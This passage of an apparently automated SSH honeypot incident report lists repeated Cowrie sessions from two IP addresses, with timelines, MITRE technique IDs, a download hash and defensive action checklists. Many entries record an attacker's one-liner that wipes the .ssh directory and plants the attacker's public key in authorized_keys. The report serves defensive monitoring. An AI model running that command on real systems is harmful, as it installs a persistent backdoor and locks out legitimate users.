| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:24:49` | `cowrie.session.connect` |
| `2026-04-25 10:24:49` | `cowrie.client.version` |
| `2026-04-25 10:24:49` | `cowrie.client.kex` |
| `2026-04-25 10:24:50` | `cowrie.login.success` |
| `2026-04-25 10:24:50` | `cowrie.session.params` |
| `2026-04-25 10:24:50` | `cowrie.command.input` |
| `2026-04-25 10:24:50` | `cowrie.command.failed` |
| `2026-04-25 10:24:50` | `cowrie.log.closed` |
| `2026-04-25 10:24:51` | `cowrie.session.params` |
| `2026-04-25 10:24:51` | `cowrie.command.input` |
| `2026-04-25 10:24:51` | `cowrie.session.file_download` |
| `2026-04-25 10:24:51` | `cowrie.log.closed` |
| `2026-04-25 10:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c036799018

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:24 |
| **Last Seen** | 2026-04-25 10:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:24:54` | `cowrie.session.connect` |
| `2026-04-25 10:24:54` | `cowrie.client.version` |
| `2026-04-25 10:24:54` | `cowrie.client.kex` |
| `2026-04-25 10:24:55` | `cowrie.login.success` |
| `2026-04-25 10:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75fc995c1edb

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:25 |
| **Last Seen** | 2026-04-25 10:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:25:50` | `cowrie.session.connect` |
| `2026-04-25 10:25:50` | `cowrie.client.version` |
| `2026-04-25 10:25:51` | `cowrie.client.kex` |
| `2026-04-25 10:25:52` | `cowrie.login.success` |
| `2026-04-25 10:25:52` | `cowrie.session.params` |
| `2026-04-25 10:25:52` | `cowrie.command.input` |
| `2026-04-25 10:25:52` | `cowrie.command.failed` |
| `2026-04-25 10:25:52` | `cowrie.log.closed` |
| `2026-04-25 10:25:53` | `cowrie.session.params` |
| `2026-04-25 10:25:53` | `cowrie.command.input` |
| `2026-04-25 10:25:53` | `cowrie.session.file_download` |
| `2026-04-25 10:25:53` | `cowrie.log.closed` |
| `2026-04-25 10:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eaebf41b5ed

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:25 |
| **Last Seen** | 2026-04-25 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:25:56` | `cowrie.session.connect` |
| `2026-04-25 10:25:56` | `cowrie.client.version` |
| `2026-04-25 10:25:56` | `cowrie.client.kex` |
| `2026-04-25 10:25:57` | `cowrie.login.success` |
| `2026-04-25 10:25:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e418b7d398

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:26 |
| **Last Seen** | 2026-04-25 10:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:26:55` | `cowrie.session.connect` |
| `2026-04-25 10:26:55` | `cowrie.client.version` |
| `2026-04-25 10:26:55` | `cowrie.client.kex` |
| `2026-04-25 10:26:56` | `cowrie.login.success` |
| `2026-04-25 10:26:57` | `cowrie.session.params` |
| `2026-04-25 10:26:57` | `cowrie.command.input` |
| `2026-04-25 10:26:57` | `cowrie.command.failed` |
| `2026-04-25 10:26:57` | `cowrie.log.closed` |
| `2026-04-25 10:26:57` | `cowrie.session.params` |
| `2026-04-25 10:26:57` | `cowrie.command.input` |
| `2026-04-25 10:26:57` | `cowrie.session.file_download` |
| `2026-04-25 10:26:57` | `cowrie.log.closed` |
| `2026-04-25 10:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07e60cbaab22

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:27 |
| **Last Seen** | 2026-04-25 10:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:27:00` | `cowrie.session.connect` |
| `2026-04-25 10:27:00` | `cowrie.client.version` |
| `2026-04-25 10:27:00` | `cowrie.client.kex` |
| `2026-04-25 10:27:01` | `cowrie.login.success` |
| `2026-04-25 10:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeb10e70623e

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:27 |
| **Last Seen** | 2026-04-25 10:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:27:58` | `cowrie.session.connect` |
| `2026-04-25 10:27:58` | `cowrie.client.version` |
| `2026-04-25 10:27:58` | `cowrie.client.kex` |
| `2026-04-25 10:27:59` | `cowrie.login.success` |
| `2026-04-25 10:28:00` | `cowrie.session.params` |
| `2026-04-25 10:28:00` | `cowrie.command.input` |
| `2026-04-25 10:28:00` | `cowrie.command.failed` |
| `2026-04-25 10:28:00` | `cowrie.log.closed` |
| `2026-04-25 10:28:00` | `cowrie.session.params` |
| `2026-04-25 10:28:00` | `cowrie.command.input` |
| `2026-04-25 10:28:01` | `cowrie.session.file_download` |
| `2026-04-25 10:28:01` | `cowrie.log.closed` |
| `2026-04-25 10:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e389c80b9779

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:28 |
| **Last Seen** | 2026-04-25 10:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:28:03` | `cowrie.session.connect` |
| `2026-04-25 10:28:03` | `cowrie.client.version` |
| `2026-04-25 10:28:04` | `cowrie.client.kex` |
| `2026-04-25 10:28:05` | `cowrie.login.success` |
| `2026-04-25 10:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6e04ec8957b

| Field | Detail |
|---|---|
| **Source IP** | `57.128.214[.]238` |
| **First Seen** | 2026-04-25 10:28 |
| **Last Seen** | 2026-04-25 10:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:28:40` | `cowrie.session.connect` |
| `2026-04-25 10:28:40` | `cowrie.client.version` |
| `2026-04-25 10:28:40` | `cowrie.client.kex` |
| `2026-04-25 10:28:41` | `cowrie.login.success` |
| `2026-04-25 10:28:41` | `cowrie.session.params` |
| `2026-04-25 10:28:41` | `cowrie.command.input` |
| `2026-04-25 10:28:41` | `cowrie.command.failed` |
| `2026-04-25 10:28:41` | `cowrie.log.closed` |
| `2026-04-25 10:28:42` | `cowrie.session.params` |
| `2026-04-25 10:28:42` | `cowrie.command.input` |
| `2026-04-25 10:28:42` | `cowrie.session.file_download` |
| `2026-04-25 10:28:42` | `cowrie.log.closed` |
| `2026-04-25 10:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.214[.]238` to AbuseIPDB if not already reported
- [ ] Block `57.128.214[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7f6225bdc07

| Field | Detail |
|---|---|
| **Source IP** | `57.128.214[.]238` |
| **First Seen** | 2026-04-25 10:28 |
| **Last Seen** | 2026-04-25 10:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:28:44` | `cowrie.session.connect` |
| `2026-04-25 10:28:44` | `cowrie.client.version` |
| `2026-04-25 10:28:44` | `cowrie.client.kex` |
| `2026-04-25 10:28:45` | `cowrie.login.success` |
| `2026-04-25 10:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.214[.]238` to AbuseIPDB if not already reported
- [ ] Block `57.128.214[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c7a7861835a

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:29 |
| **Last Seen** | 2026-04-25 10:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:29:01` | `cowrie.session.connect` |
| `2026-04-25 10:29:01` | `cowrie.client.version` |
| `2026-04-25 10:29:01` | `cowrie.client.kex` |
| `2026-04-25 10:29:02` | `cowrie.login.success` |
| `2026-04-25 10:29:03` | `cowrie.session.params` |
| `2026-04-25 10:29:03` | `cowrie.command.input` |
| `2026-04-25 10:29:03` | `cowrie.command.failed` |
| `2026-04-25 10:29:03` | `cowrie.log.closed` |
| `2026-04-25 10:29:04` | `cowrie.session.params` |
| `2026-04-25 10:29:04` | `cowrie.command.input` |
| `2026-04-25 10:29:04` | `cowrie.session.file_download` |
| `2026-04-25 10:29:04` | `cowrie.log.closed` |
| `2026-04-25 10:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-272b1520bab3

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:29 |
| **Last Seen** | 2026-04-25 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:29:07` | `cowrie.session.connect` |
| `2026-04-25 10:29:07` | `cowrie.client.version` |
| `2026-04-25 10:29:07` | `cowrie.client.kex` |
| `2026-04-25 10:29:08` | `cowrie.login.success` |
| `2026-04-25 10:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f44ae55b63b

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:33 |
| **Last Seen** | 2026-04-25 10:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:33:15` | `cowrie.session.connect` |
| `2026-04-25 10:33:15` | `cowrie.client.version` |
| `2026-04-25 10:33:15` | `cowrie.client.kex` |
| `2026-04-25 10:33:16` | `cowrie.login.success` |
| `2026-04-25 10:33:16` | `cowrie.session.params` |
| `2026-04-25 10:33:16` | `cowrie.command.input` |
| `2026-04-25 10:33:16` | `cowrie.command.failed` |
| `2026-04-25 10:33:16` | `cowrie.log.closed` |
| `2026-04-25 10:33:17` | `cowrie.session.params` |
| `2026-04-25 10:33:17` | `cowrie.command.input` |
| `2026-04-25 10:33:17` | `cowrie.session.file_download` |
| `2026-04-25 10:33:17` | `cowrie.log.closed` |
| `2026-04-25 10:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-857004aaf206

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:33 |
| **Last Seen** | 2026-04-25 10:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:33:20` | `cowrie.session.connect` |
| `2026-04-25 10:33:20` | `cowrie.client.version` |
| `2026-04-25 10:33:20` | `cowrie.client.kex` |
| `2026-04-25 10:33:21` | `cowrie.login.success` |
| `2026-04-25 10:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b14c93e07c

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:34 |
| **Last Seen** | 2026-04-25 10:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:34:22` | `cowrie.session.connect` |
| `2026-04-25 10:34:22` | `cowrie.client.version` |
| `2026-04-25 10:34:22` | `cowrie.client.kex` |
| `2026-04-25 10:34:23` | `cowrie.login.success` |
| `2026-04-25 10:34:23` | `cowrie.session.params` |
| `2026-04-25 10:34:23` | `cowrie.command.input` |
| `2026-04-25 10:34:23` | `cowrie.command.failed` |
| `2026-04-25 10:34:23` | `cowrie.log.closed` |
| `2026-04-25 10:34:24` | `cowrie.session.params` |
| `2026-04-25 10:34:24` | `cowrie.command.input` |
| `2026-04-25 10:34:24` | `cowrie.session.file_download` |
| `2026-04-25 10:34:24` | `cowrie.log.closed` |
| `2026-04-25 10:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc754d6ccdf

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:34 |
| **Last Seen** | 2026-04-25 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:34:27` | `cowrie.session.connect` |
| `2026-04-25 10:34:27` | `cowrie.client.version` |
| `2026-04-25 10:34:27` | `cowrie.client.kex` |
| `2026-04-25 10:34:28` | `cowrie.login.success` |
| `2026-04-25 10:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6adb999c22c9

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:37 |
| **Last Seen** | 2026-04-25 10:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 10:37:30` | `cowrie.session.connect` |
| `2026-04-25 10:37:30` | `cowrie.client.version` |
| `2026-04-25 10:37:31` | `cowrie.client.kex` |
| `2026-04-25 10:37:31` | `cowrie.login.success` |
| `2026-04-25 10:37:32` | `cowrie.session.params` |
| `2026-04-25 10:37:32` | `cowrie.command.input` |
| `2026-04-25 10:37:32` | `cowrie.command.failed` |
| `2026-04-25 10:37:32` | `cowrie.log.closed` |
| `2026-04-25 10:37:33` | `cowrie.session.params` |
| `2026-04-25 10:37:33` | `cowrie.command.input` |
| `2026-04-25 10:37:33` | `cowrie.session.file_download` |
| `2026-04-25 10:37:33` | `cowrie.log.closed` |
| `2026-04-25 10:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.94[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.59.94[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d42aa61902b

| Field | Detail |
|---|---|
| **Source IP** | `103.59.94[.]199` |
| **First Seen** | 2026-04-25 10:37 |
| **Last Seen** | 2026-04-25 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
